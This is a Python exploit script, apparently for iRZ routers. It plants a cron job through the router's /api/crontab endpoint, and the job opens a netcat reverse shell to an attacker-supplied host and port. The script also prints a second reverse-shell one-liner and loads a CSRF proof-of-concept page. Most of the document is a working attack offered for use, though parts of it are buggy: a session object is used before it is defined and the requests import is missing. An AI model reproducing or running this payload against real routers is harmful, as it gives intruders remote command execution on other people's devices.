import os
import json
import subprocess

option = "0"

def main():
    print("####################################################")
    print("# Welcome to IRZ CSRF to RCE Exploit - version 1.0 #")
    print("####################################################")
    print()
    print("## by redragon of WHG & rej_ex of SAKURA SAMURAI ##")
    print()
    print("1. Post Authentication RCE (Needs Credentials)")
    print("2. CSRF to RCE (No Credentials)")
    print()
    runit()

# Post Authentication RCE exploit

def runit():
	option = input("Select an option: ")    
	if option == "1":
		exploit1()
	elif option == "2":
		exploit2()
	else: print("You must select '1' or '2'. Exiting.")
     
def exploit1():
    print("## Running Post Auth RCE exploit")
    print()
    print()
    router_ip = input("## Enter the router ip to exploit: ")
    router_port = int(
        input("## Enter the victim router web page port (default is 80): ") or "80")

    router_user = input("## Enter the username for the router login: ")
    router_pass = input("## Enter the password for the router login: ")

    LHOST = input("## Enter the LHOST for the router reverse shell: ")
    LPORT = input("## Enter the LPORT for the router reverse shell: ")
    subprocess.call("nc -lvp " + str(LPORT), shell=True)

    router_url = f'http://{router_ip}:{router_port}'

    send_json_payload(router_url, router_user, router_pass, LHOST, LPORT)

def send_json_payload(router_url, router_user, router_pass, lhost_ip, lhost_port):

    intro = f'Sending the payload to {router_url}\n'
    print(intro)
    payload_str = '{"tasks":[{"enable":true,"minutes":"*","hours":"*","days":"*","months":"*","weekdays":"*","command":"rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc ' + \
        f'{lhost_ip} {lhost_port} ' + \
        '>/tmp/f"}],"_board":{"name":"RL21","platform":"irz_mt02","time":"Wed Mar 16 16:43:20 UTC 2022"}}'
    
    payload_json = json.loads(payload_str)

    s = s.session()
    s.auth = (router_user, router_pass)

    s.headers.update(
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"})
    s.headers.update({"X-Requested-With": "XMLHttpRequest"})
    s.headers.update({"Origin": router_url})
    s.headers.update({"Referer": router_url})

    s.post(router_url + "/api/crontab", json=payload_json )

    exploit_str = f'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost_ip} 443 >/tmp/f'
    
    print("Request sent! You may have to wait about 2 minutes to get a shell. \nFirst shell will die due to crontab job. Start a new listener on a new port [e.g. 443], and run the following command: " + exploit_str)
    print("To fix TTY: type telnet 0.0.0.0 in the shell")



def exploit2():
    print("sup: ")

    load_csrf_poc_file()

def load_csrf_poc_file():

    file_path = os.path.dirname(__file__) + os.sep + "poc.html"

    if os.path.isfile(file_path):
        with open(file_path) as poc_file:
            poc_data_str = poc_file.read()

        print(poc_data_str)
    else:
        print(f'{file_path} not found')


main()
